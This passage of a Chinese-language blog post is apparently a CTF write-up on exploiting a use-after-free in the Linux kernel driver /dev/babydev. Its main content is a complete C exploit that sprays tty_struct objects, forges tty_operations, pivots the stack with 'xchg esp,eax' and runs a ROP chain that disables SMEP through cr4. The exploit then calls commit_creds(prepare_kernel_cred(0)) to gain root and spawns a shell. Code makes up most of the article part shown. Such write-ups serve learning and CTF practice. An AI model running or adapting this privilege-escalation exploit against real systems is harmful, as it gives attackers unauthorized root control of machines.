class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>利用tty_struct</strong></p>
<p><code>smep</code> 只是不能执行用户态的代码，我们还是可以使用 用户态的数据的。我们可以通过 <code>rop</code> 来关闭 <code>smep</code>, 然后再在使用 <code>ret2user</code> 的技术进行提权。</p>
<p>首先我们需要控制 <code>rip</code>, 可以通过 触发 <code>uaf</code> 后，多次分配 <code>tty_struct</code> 来占坑，然后使用 <code>write</code> 修改 <code>tty_operations</code> 的指针到我们伪造的 <code>tty_operations</code> 结构体 就可以控制 <code>rip</code> 了。</p>
<p>要进行 <code>rop</code> 我们需要一个可控的 栈 。</p>
<p>这里使用 </p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513574135523zry5hfcd.png?imageslim" alt="paste image"><br>因为在调用 <code>tty_operations</code> 里面的函数时，最后一步是 <code>call rax</code>, 所以进入到这里时 的 <code>rax</code> 就为 <code>0xffffffff81007808</code> 这是一个 内核的内存地址，不过它的低 <code>32</code> 位,也即 <code>eax</code> 为 <code>0x81007808</code>,是一个 用户态的地址，我们是可以通过 <code>mmap</code> 拿到的，所以思路就是，首先通过 <code>mmap</code> 在 <code>0x81007808</code> 处布置好 <code>rop_chain</code> 然后 设置 <code>tty_operations</code>  里面的其中一个函数指针为 <code>xchg esp,eax</code> 的地址，然后调用之，就会进入 <code>rop</code> 了。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513574511704as7xnbvd.png?imageslim" alt="paste image"></p>
<p><code>xchg esp,eax</code>之后，可以发现 <code>rsp</code> 被劫持到我们可控的数据区了，接下来就是通过 <code>rop</code> 关闭 <code>semp</code>, 然后 <code>ret2user</code> 提权即可。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513574411861iv40raps.png?imageslim" alt="paste image"></p>
<p><strong>exp</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;errno.h&gt;</div><div class="line">#include &lt;sys/stat.h&gt;</div><div class="line">#include &lt;sys/ioctl.h&gt;</div><div class="line">#include &lt;fcntl.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;pty.h&gt;</div><div class="line">#include &lt;sys/mman.h&gt;</div><div class="line">#include &lt;sys/ipc.h&gt;</div><div class="line">#include &lt;sys/sem.h&gt;</div><div class="line"></div><div class="line">#define TTY_STRUCT_SIZE 0x2e0</div><div class="line">#define SPRAY_ALLOC_TIMES 0x100</div><div class="line"></div><div class="line">int spray_fd[0x100];</div><div class="line"></div><div class="line">/* // 将tty_struct放入UAF空间，将第24字节的位置用伪造的tty_operations替换，如147、148行所示</div><div class="line">tty_struct:</div><div class="line">int magic; // 4</div><div class="line">struct kref kref; // 4</div><div class="line">struct device *dev; // 8</div><div class="line">struct tty_driver *driver; // 8</div><div class="line">const struct tty_operations *ops; // 8, offset = 4 + 4 + 8 + 8 = 24</div><div class="line">[...]</div><div class="line">*/</div><div class="line"></div><div class="line">struct tty_operations &#123;</div><div class="line">    struct tty_struct * (*lookup)(struct tty_driver *driver,</div><div class="line">    struct file *filp, int idx);</div><div class="line">    int (*install)(struct tty_driver *driver, struct tty_struct *tty);</div><div class="line">    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);</div><div class="line">    int (*open)(struct tty_struct * tty, struct file * filp);</div><div class="line">    void (*close)(struct tty_struct * tty, struct file * filp);</div><div class="line">    void (*shutdown)(struct tty_struct *tty);</div><div class="line">    void (*cleanup)(struct tty_struct *tty);</div><div class="line">    int (*write)(struct tty_struct * tty,</div><div class="line">    const unsigned char *buf, int count);</div><div class="line">    int (*put_char)(struct tty_struct *tty, unsigned char ch);</div><div class="line">    void (*flush_chars)(struct tty_struct *tty);</div><div class="line">    int (*write_room)(struct tty_struct *tty);</div><div class="line">    int (*chars_in_buffer)(struct tty_struct *tty);</div><div class="line">    int (*ioctl)(struct tty_struct *tty,</div><div class="line">    unsigned int cmd, unsigned long arg);</div><div class="line">    long (*compat_ioctl)(struct tty_struct *tty,</div><div class="line">    unsigned int cmd, unsigned long arg);</div><div class="line">    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);</div><div class="line">    void (*throttle)(struct tty_struct * tty);</div><div class="line">    void (*unthrottle)(struct tty_struct * tty);</div><div class="line">    void (*stop)(struct tty_struct *tty);</div><div class="line">    void (*start)(struct tty_struct *tty);</div><div class="line">    void (*hangup)(struct tty_struct *tty);</div><div class="line">    int (*break_ctl)(struct tty_struct *tty, int state);</div><div class="line">    void (*flush_buffer)(struct tty_struct *tty);</div><div class="line">    void (*set_ldisc)(struct tty_struct *tty);</div><div class="line">    void (*wait_until_sent)(struct tty_struct *tty, int timeout);</div><div class="line">    void (*send_xchar)(struct tty_struct *tty, char ch);</div><div class="line">    int (*tiocmget)(struct tty_struct *tty);</div><div class="line">    int (*tiocmset)(struct tty_struct *tty,</div><div class="line">    unsigned int set, unsigned int clear);</div><div class="line">    int (*resize)(struct tty_struct *tty, struct winsize *ws);</div><div class="line">    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</div><div class="line">    int (*get_icount)(struct tty_struct *tty,</div><div class="line">    struct serial_icounter_struct *icount);</div><div class="line">    const struct file_operations *proc_fops;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">typedef int __attribute__((regparm(3)))(*_commit_creds)(unsigned long cred);</div><div class="line">typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);</div><div class="line"></div><div class="line">/* Gadgets */</div><div class="line">_commit_creds commit_creds = (_commit_creds) 0xffffffff810a1420;</div><div class="line">_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred) 0xffffffff810a1810;</div><div class="line">unsigned long native_write_cr4 = 0xFFFFFFFF810635B0; // 写入cr4来关闭smep</div><div class="line">unsigned long xchgeaxesp = 0xFFFFFFFF81007808; // 设置栈</div><div class="line">unsigned long poprdiret = 0xFFFFFFFF813E7D6F;</div><div class="line">//unsigned long iretq = 0xFFFFFFFF8181A797;</div><div class="line">unsigned long iretq = 0xffffffff814e35ef;</div><div class="line">unsigned long swapgs = 0xFFFFFFFF81063694;  // 回到用户空间之前的准备</div><div class="line"></div><div class="line">/* status */</div><div class="line">unsigned long user_cs, user_ss, user_rflags;</div><div class="line">void save_stats() &#123;</div><div class="line">    asm(</div><div class="line">        &quot;movq %%cs, %0\n&quot; // mov rcx, cs</div><div class="line">        &quot;movq %%ss, %1\n&quot; // mov rdx, ss</div><div class="line">        &quot;pushfq\n&quot;        // 把rflags的值压栈</div><div class="line">        &quot;popq %2\n&quot;       // pop rax</div><div class="line">        :&quot;=r&quot;(user_cs), &quot;=r&quot;(user_ss), &quot;=r&quot;(user_rflags) : : &quot;memory&quot; // mov user_cs, rcx; mov user_ss, rdx; mov user_flags, rax</div><div class="line">        );</div><div class="line">&#125;</div><div class="line"></div><div class="line">void get_shell() &#123;</div><div class="line">    system(&quot;/bin/sh&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void get_root() &#123;</div><div class="line">    commit_creds(prepare_kernel_cred(0));</div><div class="line">&#125;</div><div class="line"></div><div class="line">void exploit() &#123;</div><div class="line">    int i;</div><div class="line">    char *buf = (char*)malloc(0x1000);</div><div class="line">    struct tty_operations *fake_tty_operations = (struct tty_operations *)malloc(sizeof(struct tty_operations));</div><div class="line"></div><div class="line">    save_stats();</div><div class="line"></div><div class="line">    memset(fake_tty_operations, 0, sizeof(struct tty_operations));</div><div class="line">    fake_tty_operations-&gt;ioctl = (unsigned long)xchgeaxesp; // 设置tty的ioctl操作为栈转移指令</div><div class="line"></div><div class="line">    int fd1 = open(&quot;/dev/babydev&quot;, O_RDWR);</div><div class="line">    int fd2 = open(&quot;/dev/babydev&quot;, O_RDWR);</div><div class="line"></div><div class="line">    ioctl(fd1, 0x10001, TTY_STRUCT_SIZE);</div><div class="line">    write(fd2, &quot;hello world&quot;, strlen(&quot;hello world&quot;));</div><div class="line">    close(fd1);</div><div class="line"></div><div class="line">    // spray tty 这里的堆喷射其实去掉也能成功，因为是释放后紧接着申请的</div><div class="line">    puts(&quot;[+] Spraying buffer with tty_struct&quot;);</div><div class="line">    for (i = 0; i &lt; SPRAY_ALLOC_TIMES; i++) &#123;</div><div class="line">        spray_fd[i] = open(&quot;/dev/ptmx&quot;, O_RDWR | O_NOCTTY);</div><div class="line">        if (spray_fd[i] &lt; 0) &#123;</div><div class="line">            perror(&quot;open tty&quot;);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 现在有一个tty_struct落在了UAF区域里</div><div class="line">    puts(&quot;[+] Reading buffer content from kernel buffer&quot;);</div><div class="line">    long size = read(fd2, buf, 32);</div><div class="line">    if (size &lt; 32) &#123;</div><div class="line">        puts(&quot;[-] Reading not complete!&quot;);</div><div class="line">        printf(&quot;[-] Only %ld bytes read.\n&quot;, size);</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">    // 检查喷射是否成功</div><div class="line">    puts(&quot;[+] Detecting buffer content type&quot;);</div><div class="line">    if (buf[0] != 0x01 || buf[1] != 0x54) &#123;</div><div class="line">        puts(&quot;[-] tty_struct spray failed&quot;);</div><div class="line">        printf(&quot;[-] We should have 0x01 and 0x54, instead we got %02x %02x\n&quot;, buf[0], buf[1]);</div><div class="line">        puts(&quot;[-] Exiting...&quot;);</div><div class="line">        exit(-1);</div><div class="line">    &#125;</div><div class="line">    // 设置tty_operations为伪造的操作</div><div class="line">    puts(&quot;[+] Spray complete. Modifying function pointer&quot;);</div><div class="line">    unsigned long *temp = (unsigned long *)&amp;buf[24];</div><div class="line">    *temp = (unsigned long)fake_tty_operations;</div><div class="line"></div><div class="line">    puts(&quot;[+] Preparing ROP chain&quot;);</div><div class="line">    unsigned long lower_address = xchgeaxesp &amp; 0xFFFFFFFF;</div><div class="line">    unsigned long base = lower_address &amp; ~0xfff;</div><div class="line">    printf(&quot;[+] Base address is %lx\n&quot;, base);</div><div class="line">    if (mmap(base, 0x30000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) != base) &#123;</div><div class="line">        perror(&quot;mmap&quot;);</div><div class="line">        exit(1);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    unsigned long rop_chain[] = &#123;</div><div class="line">        poprdiret,</div><div class="line">        0x6f0,</div><div class="line">        native_write_cr4, // cr4 = 0x6f0</div><div class="line">        (unsigned long)get_root,</div><div class="line">        swapgs, // swapgs; pop rbp; ret</div><div class="line">        base,   // rbp = base</div><div class="line">        iretq,</div><div class="line">        (unsigned long)get_shell,</div><div class="line">        user_cs,</div><div class="line">        user_rflags,</div><div class="line">        base + 0x10000,</div><div class="line">        user_ss</div><div class="line">    &#125;;</div><div class="line">    memcpy((void*)lower_address, rop_chain, sizeof(rop_chain));</div><div class="line">    puts(&quot;[+] Writing function pointer to the driver&quot;);</div><div class="line">    long len = write(fd2, buf, 32);</div><div class="line">    if (len &lt; 0) &#123;</div><div class="line">        perror(&quot;write&quot;);</div><div class="line">        exit(1);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    puts(&quot;[+] Triggering&quot;);</div><div class="line">    for (i = 0;i &lt; SPRAY_ALLOC_TIMES; i++) &#123;</div><div class="line">        ioctl(spray_fd[i], 0, 0); // FFFFFFFF814D8AED call rax</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main() &#123;</div><div class="line">    exploit();</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p> 内核态和用户态其实也差不多，主要就是对内存机制要非常了解。 <code>xchg esp, eax</code> 然后 <code>mmap</code> 即可控制 栈数据， 这个技巧确实厉害。使用 <code>gef</code> 没法调内核，换了 <code>pwndbg</code> 就可以了.</p>
<p><strong>参考</strong></p>
<p> <a href="http://pwn4.fun/2017/08/15/Linux-Kernel-UAF/" target="_blank" rel="external">http://pwn4.fun/2017/08/15/Linux-Kernel-UAF/</a></p>
<p> <a href="http://bobao.360.cn/learning/detail/4148.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/4148.html</a></p>

        
                <blockquote style="margin: 2em 0 0;padding: 0.5em 1em;border-left: 3px solid #F44336;background-color: #F5F5F5;list-style: none;">
                    <p><strong>
                         
                            <a>本站文章均原创， 转载注明来源</a>
                        </strong>
                        <br>
                        <strong>本文链接：</strong><a href="http://blog.hac425.top/2017/12/18/linux_kernel_uaf_exploit.html">http://blog.hac425.top/2017/12/18/linux_kernel_uaf_exploit.html</a>
                    </p>
                </blockquote>
        
    

    
</div>


                

                <!-- Post Comments -->
                
                    
    <!-- 使用 来必力 -->
<div id="livere-comment">
    <!-- 来必力City版安装代码 -->
<div id="lv-container" data-id="city" data-uid="MTAyMC8zMTQ2OC84MDMy">
<script type="text/javascript">
   (function(d, s) {
       var j, e = d.getElementsByTagName(s)[0];

       if (typeof LivereTower === 'function') { return; }

       j = d.createElement(s);
       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
       j.async = true;

       e.parentNode.insertBefore(j, e);
   })(document, 'script');
</script>
<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
</div>
<!-- City版安装代码已完成 -->
</div>
<style>
    #livere-comment{
        background-color: #eee;
        padding: 2pc;
    }
</style>

                
            </div>

            <!-- Post Prev & Next Nav -->
            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
    <!-- Prev Nav -->
    
        <a href="/2017/12/18/0ctf2017_babyheap.html" id="post_nav-newer" class="prev-content">
            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                <i class="material-icons">arrow_back</i>
            </button>
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
            新篇
        </a>
    

    <!-- Section Spacer -->
    <div class="section-spacer"></div>

    <!-- Next Nav -->
    
        <a href="/2017/12/17/pwn_with_format_0ctf_easyprintf.html" id="post_nav-older" class="next-content">
            旧篇
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                <i class="material-icons">arrow_forward</i>
            </button>
        </a>
    
</nav>

        </div>
    </div>



                    
                        <!-- Overlay For Active Sidebar -->
<div class="sidebar-overlay"></div>

<!-- Material sidebar -->
<aside id="sidebar" class="sidebar sidebar-colored sidebar-fixed-left" role="navigation">
    <div id="sidebar-main">
        <!-- Sidebar Header -->
        <div class="sidebar-header header-cover" style="background-image: url(/img/sidebar_header.png);">
    <!-- Top bar -->
    <div class="top-bar"></div>

    <!-- Sidebar toggle button -->
    <button type="button" class="sidebar-toggle mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" style="display: initial;" data-upgraded=",MaterialButton,MaterialRipple">
        <i class="material-icons">clear_all</i>
        <span class="mdl-button__ripple-container">
            <span class="mdl-ripple">
            </span>
        </span>
    </button>

    <!-- Sidebar Avatar -->
    <div class="sidebar-image">
        <img src="/img/girl.png" alt="hac425's avatar">
    </div>

    <!-- Sidebar Email -->
    <a data-toggle="dropdown" class="sidebar-brand" href="#settings-dropdown">
        hac425xxx@gmail.com
        <b class="caret"></b>
    </a>
</div>


        <!-- Sidebar Navigation  -->
        <ul class="nav sidebar-nav">
    <!-- User dropdown  -->
    <li class="dropdown">
        <ul id="settings-dropdown" class="dropdown-menu">
            
                <li>
                    <a href="#" target="_blank" title="Email Me">
                        
                            <i class="material-icons sidebar-material-icons sidebar-indent-left1pc-element">email</i>
                        
                        Email Me
                    </a>
                </li>
            
        </ul>
    </li>

    <!-- Homepage -->
    
        <li id="sidebar-first-li">
            <a href="/">
                
                    <i class="material-icons sidebar-material-icons">home</i>
                
                主页
            </a>
        </li>
        
    

    <!-- Archives  -->
    
        <li class="dropdown">
            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
                
                    <i class="material-icons sidebar-material-icons">inbox</i>
                
                    归档
                <b class="caret"></b>
            </a>
            <ul class="dropdown-menu">
            <li>
                <a class="sidebar_archives-link" href="/archives/2018/01/">一月 2018<span class="sidebar_archives-count">8</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/12/">十二月 2017<span class="sidebar_archives-count">13</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/11/">十一月 2017<span class="sidebar_archives-count">8</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/10/">十月 2017<span class="sidebar_archives-count">11</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/08/">八月 2017<span class="sidebar_archives-count">1</span></a>
            </ul>
        </li>
        
    

    <!-- Categories  -->
    
        <li class="dropdown">
            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
                
                    <i class="material-icons sidebar-material-icons">chrome_reader_mode</i>
                
                分类
                <b class="caret"></b>
            </a>
            <ul class="dropdown-menu">
                <li>
                <a class="sidebar_archives-link" href="/categories/Vulnerability-analysis/">Vulnerability analysis<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/android/">android<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/chrome/">chrome<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/ctf/">ctf<span class="sidebar_archives-count">11</span></a></li><li><a class="sidebar_archives-link" href="/categories/java应用破解思路/">java应用破解思路<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/jeb破解/">jeb破解<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/categories/kernel/">kernel<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/pwn-router-os/">pwn_router_os<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/categories/reverse/">reverse<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/安卓安全/">安卓安全<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/categories/文件patch/">文件patch<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/渗透测试/">渗透测试<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/categories/路由器安全/">路由器安全<span class="sidebar_archives-count">10</span></a>
            </ul>
        </li>
        
            <li class="divider"></li>
        
    

    <!-- Pages  -->
    
        <li>
            <a href="/about" title="关于我">
                
                    <i class="material-icons sidebar-material-icons">person</i>
                
                关于我
            </a>
        </li>
        
    
        <li>
            <a href="/timeline" title="时间轴">
                
                    <i class="material-icons sidebar-material-icons">timeline</i>
                
                时间轴
            </a>
        </li>
        
    
        <li>
            <a href="/links" title="友情链接">
                
                    <i class="material-icons sidebar-material-icons">people</i>
                
                友情链接
            </a>
        </li>
        
    
        <li>
            <a href="/tags" title="标签云">
                
                    <i class="material-icons sidebar-material-icons">invert_colors</i>
                
                标签云
            </a>
        </li>
        
    

    <!-- Article Number  -->
    
        <li>
            <a href="/archives">
                文章总数
                <span class="sidebar-badge">41</span>
            </a>
        </li>
        
    
</ul>


        <!-- Sidebar Footer -->
        <!--
I'm glad you use this theme, the development is no so easy, I hope you can keep the copyright, I will thank you so much.
If you still want to delete the copyrights, could you still retain the first one? Which namely "Theme Material"
It will not impact the appearance and can give developers a lot of support :)

很高兴您使用并喜欢该主题，开发不易 十分谢谢与希望您可以保留一下版权声明。
如果您仍然想删除的话 能否只保留第一项呢？即 "Theme Material"
它不会影响美观并可以给开发者很大的支持和动力。 :)
-->

<!-- Sidebar Divider -->


<!-- Theme Material -->


<!-- Help & Support -->
<!--

-->

<!-- Feedback -->
<!--

-->

<!-- About Theme -->
<!--

-->

    </div>

    <!-- Sidebar Image -->
    

</aside>

                    

                    
                        <!-- Footer Top Button -->
                        <div id="back-to-top" class="toTop-wrap">
    <a href="#top" class="toTop">
        <i class="material-icons footer_top-i">expand_less</i>
    </a>
</div>

                    

                    <script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>

<!--Footer-->
<footer class="mdl-mini-footer" id="bottom">
    
        <!-- Paradox Footer Left Section -->
        <div class="mdl-mini-footer--left-section sns-list">
    <!-- Twitter -->
    
        <a href="https://twitter.com/hac425" target="_blank">
            <button class="mdl-mini-footer--social-btn social-btn footer-sns-twitter">
                <span class="visuallyhidden">Twitter</span>
            </button><!--
     --></a>
    

    <!-- Facebook -->
    

    <!-- Google + -->
    

    <!-- Weibo -->
    
        <a href="http://weibo.com/u/5691483590" target="_blank">
            <button class="mdl-mini-footer--social-btn social-btn footer-sns-weibo">
                <span class="visuallyhidden">Weibo</span>
            </button><!--
     --></a>
    

    <!-- Instagram -->
    

    <!-- Tumblr -->
    

    <!-- Github -->
    
        <a href="https://github.com/jinyu00" target="_blank">
            <button class="mdl-mini-footer--social-btn social-btn footer-sns-github">
                <span class="visuallyhidden">Github</span>
            </button><!--
     --></a>
    

    <!-- LinkedIn -->
    

    <!-- Zhihu -->
    

    <!-- Bilibili -->
    

    <!-- Telegram -->
    
    
    <!-- V2EX -->
    
</div>


        <!--Copyright-->
        <div id="copyright">
            Copyright&nbsp;©<script type="text/javascript">var fd = new Date();document.write("&nbsp;" + fd.getFullYear() + "&nbsp;");</script>穷则变，变则通，通则久
            
        </div>

        <!-- Paradox Footer Right Section -->

    
</footer>


                    <!-- Import JS File -->

    <script>lsloader.load("lazyload_js","/js/lazyload.min.js?wgjW/HuQG9JDgvPDPoRAng==", true)</script>



    <script>lsloader.load("js_js","/js/js.min.js?V/53wGualMuiPM3xoetD5Q==", true)</script>



    <script>lsloader.load("np_js","/js/nprogress.js?pl3Qhb9lvqR1FlyLUna1Yw==", true)</script>


<script type="text/ls-javascript" id="NProgress-script">
    NProgress.configure({
        showSpinner: true
    });
    NProgress.start();
    $('#nprogress .bar').css({
        'background': '#29d'
    });
    $('#nprogress .peg').css({
        'box-shadow': '0 0 10px #29d, 0 0 15px #29d'
    });
    $('#nprogress .spinner-icon').css({
        'border-top-color': '#29d',
        'border-left-color': '#29d'
    });
    setTimeout(function() {
        NProgress.done();
        $('.fade').removeClass('out');
    }, 800);
</script>







    <!-- Busuanzi -->
    <script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>



   





<!-- UC Browser Compatible -->
<script>
	var agent = navigator.userAgent.toLowerCase();
	if(agent.indexOf('ucbrowser')>0) {
		document.write('<link rel="stylesheet" href="/css/uc.css">');
	   alert('由于 UC 浏览器使用极旧的内核，而本网站使用了一些新的特性。\n为了您能更好的浏览，推荐使用 Chrome 或 Firefox 浏览器。');
	}
</script>

<!-- Import prettify js  -->



<!-- Window Load -->
<!-- add class for prettify -->
<script type="text/ls-javascript" id="window-load">
    $(window).on('load', function() {
        // Post_Toc parent position fixed
        $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
    });

    
    
</script>

<!-- MathJax Load-->


<!-- Bing Background -->


<script type="text/ls-javascript" id="lazy-load">
    // Offer LazyLoad
    queue.offer(function(){
        $('.lazy').lazyload({
            effect : 'show'
        });
    });

    // Start Queue
    $(document).ready(function(){
        setInterval(function(){
            queue.execNext();
        },200);
    });
</script>

<!-- Custom Footer -->



<script>
    (function(){
        var scriptList = document.querySelectorAll('script[type="text/ls-javascript"]')

        for (var i = 0; i < scriptList.length; ++i) {
            var item = scriptList[i];
            lsloader.runInlineScript(item.id,item.id);
        }
    })()
console.log('\n %c © Material Theme | Version: 1.5.0 | https://github.com/viosey/hexo-theme-material %c \n', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-left-radius:5px;border-bottom-left-radius:5px;', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-right-radius:5px;border-bottom-right-radius:5px;');
</script>

                </main>
            </div>
        </body>
    
</html>
